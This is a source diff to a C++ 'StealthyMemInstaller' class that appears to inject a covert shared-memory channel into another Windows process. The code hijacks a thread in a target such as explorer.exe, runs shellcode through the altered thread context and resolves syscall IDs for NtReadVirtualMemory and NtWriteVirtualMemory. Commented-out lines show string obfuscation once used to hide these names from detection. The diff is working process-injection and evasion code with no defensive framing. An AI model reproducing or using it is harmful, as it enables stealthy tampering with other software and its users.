@@ -17,9 +17,11 @@ using namespace std;
 
 BOOL StealthyMemInstaller::Init(vector<wstring> preferedTIDsModules, wstring targetProcessName) {
     // hiding names
-    sharedMemName = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M';
-	globalMutex = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M'+'M'+'t'+'x';
+    // sharedMemName = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M';
+	// globalMutex = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M'+'M'+'t'+'x';
 	// explExeName = L'e'+L'x'+L'p'+L'l'+L'o'+L'r'+L'e'+L'r'+L'.'+L'e'+L'x'+L'e';
+	sharedMemName = "Global\\SMemM";
+	globalMutex = "Global\\SMemMMtx";
 	explExeName = L"explorer.exe";
 	this->targetProcessName = targetProcessName;
 	this->preferedTIDsModules = preferedTIDsModules;
@@ -64,14 +66,14 @@ BOOL StealthyMemInstaller::Install() {
 	}
 
 	if (!CreateSharedFileMapping()) {
-		cout << "Install() failed: CreateSharedFileMapping failed." << endl;
+		cout << "Install() failed: CreateSharedFileMapping failed. " << GetLastError() <<endl;
 		return FALSE;
 	}
 
-	// if (!CreateExternalGatekeeperHandleToFileMapping()) {
-	// 	cout << "Install() failed: Gatekeeperhandle failed." << endl;
-	// 	return FALSE;
-	// }
+	if (!CreateExternalGatekeeperHandleToFileMapping()) {
+		cout << "Install() failed: Gatekeeperhandle failed." << endl;
+		return FALSE;
+	}
 
 	if (!InjectFileMappingShellcodeIntoTargetThread()) {
         cout << "Install() failed: ConnectFileMappingWithTargetThread failed." << endl;
@@ -276,7 +278,7 @@ BOOL StealthyMemInstaller::FindUsableTID() {
 	if (!targetTID) {
 		return FALSE; // Could not find any of the threads starting in one of the target modules
 	}
-
+	wcout << "using: " << modName << endl;
 	hTargetThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetTID);
 	if (!hTargetThread) {
 		cout << "Install()::FindUsableTID() failed: could not open thread." << endl;
@@ -402,7 +404,7 @@ BOOL StealthyMemInstaller::InjectFileMappingShellcodeIntoTargetThread() {
 		return FALSE;
 	}
 		
- 
+	
 	if (!ExecShellcodeWithHijackedThread(fullShellcodeSize - sizeof(lpNameBuffer), FALSE)) {
 		return FALSE;
 	} 
@@ -431,7 +433,7 @@ BOOL StealthyMemInstaller::ExecShellcodeWithHijackedThread(SIZE_T shellcodeSize 
 		for (int i = 0; i < suspendCount; ++i) {
 			ResumeThread(hTargetThread);
 		}
-	} 
+	}
 	GetThreadContext(hTargetThread, &tcInitial);
 	CopyMemory(&tcHiJack, &tcInitial, sizeof(CONTEXT)); // Faster than another call to GetThreadContext
 	CopyMemory(&tcCurrent, &tcInitial, sizeof(CONTEXT));
@@ -442,14 +444,13 @@ BOOL StealthyMemInstaller::ExecShellcodeWithHijackedThread(SIZE_T shellcodeSize 
 	if (shellcodeSize == NULL) {
 		return TRUE; // Permanent thread hijack, do not wait for any execution completion
 	}
-		
- 
+
 	// Check the thread context to know when done executing (RIP should be at memory address + size of shellcode - 2 in the infinite loop jmp rel8 -2)
 	DWORD64 addrEndOfExec = (DWORD64)remoteExecutableMem + shellcodeSize - 2;
 	do {
 		GetThreadContext(hTargetThread, &tcCurrent);
 	} while (tcCurrent.Rip != addrEndOfExec);
- 
+
 	if (thenRestore) {
 		// Execution finished, resuming previous operations
 		SuspendThread(hTargetThread);
@@ -468,9 +469,11 @@ BOOL StealthyMemInstaller::InjectCommunicationShellcodeIntoTargetThread() {
 	void* controlRemoteAddr = (void*)((DWORD64)ptrRemoteSharedMem + sharedMemSize - sizeof(controlStruct));
  
 	// Getting function addresses
-	string e = "";
-	string ntrvmNoStr = e+'N'+'t'+'R'+'e'+'a'+'d'+'V'+'i'+'r'+'t'+'u'+'a'+'l'+'M'+'e'+'m'+'o'+'r'+'y';
-	string ntwvmNoStr = e+'N'+'t'+'W'+'r'+'i'+'t'+'e'+'V'+'i'+'r'+'t'+'u'+'a'+'l'+'M'+'e'+'m'+'o'+'r'+'y';
+	// string e = "";
+	// string ntrvmNoStr = e+'N'+'t'+'R'+'e'+'a'+'d'+'V'+'i'+'r'+'t'+'u'+'a'+'l'+'M'+'e'+'m'+'o'+'r'+'y';
+	// string ntwvmNoStr = e+'N'+'t'+'W'+'r'+'i'+'t'+'e'+'V'+'i'+'r'+'t'+'u'+'a'+'l'+'M'+'e'+'m'+'o'+'r'+'y';
+	string ntrvmNoStr = "NtReadVirtualMemory";
+	string ntwvmNoStr = "NtWriteVirtualMemory";
 	DWORD syscallIndexZwRVM = GetSyscallId("ntdll.dll", ntrvmNoStr);
 	DWORD syscallIndexZwWVM = GetSyscallId("ntdll.dll", ntwvmNoStr);
 	if (!syscallIndexZwRVM || !syscallIndexZwWVM) {
